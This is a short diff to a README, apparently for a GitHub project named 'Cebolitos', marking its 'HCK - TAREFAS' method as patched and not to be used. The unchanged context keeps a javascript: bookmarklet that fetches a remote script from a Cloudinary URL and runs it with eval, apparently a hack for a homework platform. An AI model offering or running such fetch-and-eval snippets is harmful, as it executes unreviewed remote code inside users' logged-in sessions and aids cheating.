@@ -7,7 +7,7 @@
 - [Repositório](https://github.com/DontBrazz/Cebolitos)
 - [DontBrazz](https://github.com/DontBrazz)
 
-## HCK - TAREFAS:
+## HCK - TAREFAS: (MÉTODO CORRIGIDO NÃO USE!!)
 ```js
 javascript:fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1745882260/saladofuturov2.js").then(t=>t.text()).then(eval);
 ```
